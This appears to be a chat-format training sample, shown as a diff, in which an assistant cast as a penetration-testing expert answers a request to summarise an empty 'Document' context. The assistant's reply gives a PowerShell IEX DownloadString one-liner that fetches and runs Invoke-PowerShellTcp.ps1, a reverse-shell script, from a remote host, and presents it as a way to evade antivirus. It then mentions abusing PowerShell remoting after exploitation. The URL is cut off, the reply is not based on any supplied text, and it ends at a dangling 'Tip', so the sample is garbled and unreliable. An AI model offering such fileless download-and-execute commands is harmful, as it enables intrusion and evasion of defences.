@@ -1,0 +1,21 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Describe the steps or process outlined in the following text: (Context: from Document)
+
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+The following PowerShell command can be used to avoid detection by
+security products and antivirus software:
+PS > IEX (New-Object Net.WebClient).DownloadString('h
+/Invoke-PowerShellTcp.ps1')
+This command directly loads a PS1 file from the Internet instead of
+downloading it and then executes it on the device.
+Remote management in Windows via PowerShell (often called PowerShell
+[PS] remoting) is a basic feature that a system administrator can use to
+access and manage a system remotely. An attacker could also take
+advantage of this feature to perform post-exploitation activities.
+Tip
